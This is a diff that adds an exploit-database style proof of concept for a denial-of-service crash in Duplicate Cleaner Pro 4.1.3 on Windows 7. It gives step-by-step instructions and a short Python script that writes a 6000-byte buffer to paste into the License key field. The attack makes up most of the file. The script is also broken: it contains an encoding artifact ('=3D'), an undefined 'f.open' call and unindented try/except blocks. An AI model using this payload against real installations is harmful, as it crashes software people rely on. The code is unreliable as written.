@@ -1,0 +1,26 @@
+# Exploit Title: Duplicate Cleaner Pro 4 - Denial of Service (PoC)
+# Date: 2020-01-05
+# Vendor Homepage:https://www.digitalvolcano.co.uk/index.html
+# Software Link:  https://www.digitalvolcano.co.uk/download/DuplicateCleanerPro4_setup.exe
+# Exploit Author: Achilles
+# Tested Version: 4.1.3
+# Tested on: Windows 7 x64
+
+
+# 1.- Run python code :
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open Duplicate Cleaner Pro
+# 4.- Paste the content of EVIL.txt into the Field: 'License key'
+# 5.- Click 'Activate' and you will see a crash.
+
+#!/usr/bin/env python
+buffer =3D "\x41" * 6000
+
+try:
+f.open("Evil.txt","w")
+print "[+] Creating %s bytes evil payload.." %len(buffer)
+f.write(buffer)
+f.close()
+print "[+] File created!"
+except:
+print "File cannot be created"
